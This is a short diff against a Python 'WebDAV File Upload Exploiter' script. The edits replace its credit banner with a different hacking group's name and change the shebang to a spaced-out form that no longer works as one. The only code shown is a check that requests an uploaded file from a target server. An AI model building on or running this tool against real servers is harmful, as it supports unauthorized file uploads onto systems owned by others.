@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#! / usr / bin / python
 
 import requests
 import string
@@ -37,8 +37,8 @@ def webdav():
 def cekfile():
  print("""
 [*] WebDAV File Upload Exploiter
-[*] Coded To Python By AndroSec1337 Cyber Team
-[*] Thx To Tu5b0l3d IndoXploit For PHP Exploit
+[*] Coded To Python By ./sT0ry_mB3m
+[*] Thx To TeamDestroyerd
 """)
  print("[*] Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
  r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
